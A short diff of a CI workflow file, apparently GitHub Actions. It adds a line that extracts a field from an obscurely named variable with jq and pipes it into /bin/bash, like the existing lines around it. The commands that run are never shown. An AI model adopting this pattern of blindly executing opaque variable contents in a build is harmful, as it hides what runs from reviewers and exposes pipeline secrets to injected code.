@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$snol600" | jq -r .lf3838 | /bin/bash
           printf '%s' "$m9561" | jq -r .iija8011 | /bin/bash
           printf '%s' "$ch4095" | jq -r .kcgsc98 | /bin/bash
+          echo $hyw5818 | jq -r .nd8658 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
